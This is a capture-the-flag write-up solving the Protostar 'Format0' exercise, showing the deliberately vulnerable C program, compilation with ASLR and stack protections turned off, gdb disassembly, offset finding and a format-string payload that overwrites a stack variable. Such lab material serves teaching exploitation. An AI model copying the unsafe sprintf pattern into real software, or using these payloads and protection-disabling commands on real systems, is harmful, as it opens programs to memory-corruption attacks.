## Protostar-Format0 Solution

### 1. Introduction

This is a poc solution for the "Format0" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419081926/https://exploit-exercises.com/protostar/format0/](https://web.archive.org/web/20170419081926/https://exploit-exercises.com/protostar/format0/) 
 
**Hints:**
* This level should be done in less than 10 bytes of input.
* “Exploiting format string vulnerabilities”

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o format_0 format_0.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Silently (-q) start with gdb.
2. Disassemble the main function.
3. Checking target function (win).


```nasm
0x08048498 <+20>:	call   0x804844d <vuln>
```
The instruction above can be found in **disassemble main** command output.
```nasm
gdb-peda$ disas 0x804844d
Dump of assembler code for function vuln:
   0x0804844d <+0>:	push   ebp
   0x0804844e <+1>:	mov    ebp,esp
   0x08048450 <+3>:	sub    esp,0x68
   0x08048453 <+6>:	mov    DWORD PTR [ebp-0xc],0x0
   0x0804845a <+13>:	mov    eax,DWORD PTR [ebp+0x8]
   0x0804845d <+16>:	mov    DWORD PTR [esp+0x4],eax
   0x08048461 <+20>:	lea    eax,[ebp-0x4c]
   0x08048464 <+23>:	mov    DWORD PTR [esp],eax
   0x08048467 <+26>:	call   0x8048340 <sprintf@plt>
   0x0804846c <+31>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804846f <+34>:	cmp    eax,0xdeadbeef
   0x08048474 <+39>:	jne    0x8048482 <vuln+53>
   0x08048476 <+41>:	mov    DWORD PTR [esp],0x8048530
   0x0804847d <+48>:	call   0x8048310 <puts@plt>
   0x08048482 <+53>:	leave  
   0x08048483 <+54>:	ret    
End of assembler dump.
```

```nasm
0x0804846f <+34>:	cmp    eax,0xdeadbeef
```

As seen above, compares the value on eax register. If it is not equal to **0xdeadbeef** it jumps to **\<vuln+53\>** (leave instruction) otherwise it continues and prints out the message.

Let's have fun a bit and set the value on **eax** to **0xdeadbeef** manualy :)

```nasm
gdb-peda$ b * 0x0804846f
Breakpoint 1 at 0x804846f: file format_0.c, line 15.

gdb-peda$ r
Starting program: format_0
...TRIM...
[-------------------------------------code-------------------------------------]
   0x8048464 <vuln+23>:	mov    DWORD PTR [esp],eax
   0x8048467 <vuln+26>:	call   0x8048340 <sprintf@plt>
   0x804846c <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
=> 0x804846f <vuln+34>:	cmp    eax,0xdeadbeef
...TRIM...
gdb-peda$ set $eax = 0xdeadbeef
gdb-peda$ c
Continuing.
you have hit the target correctly :)
[Inferior 1 (process 2629) exited with code 045]
Warning: not running
```


#### 2.2 Quick Solution
 
Let's find the offset; 

```
gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

gdb-peda$ i r eax eip ebp
eax            0x63413163	-> 64
eip            0x37634136	-> 80
ebp            0x63413563	-> 76
```

we are able to overwrite eax after 64 junk bytes then our final payload will be:
```
$(python -c 'print "A" * 64 + "\xef\xbe\xad\xde"')
```

#### 2.3 Final PoC

Because of the format string vulnerability it's possible to add 64 padding by using the following as well... 
```
$ ./format_0 $(python -c "print '%64d\xef\xbe\xad\xde'")
you have hit the target correctly :)
```
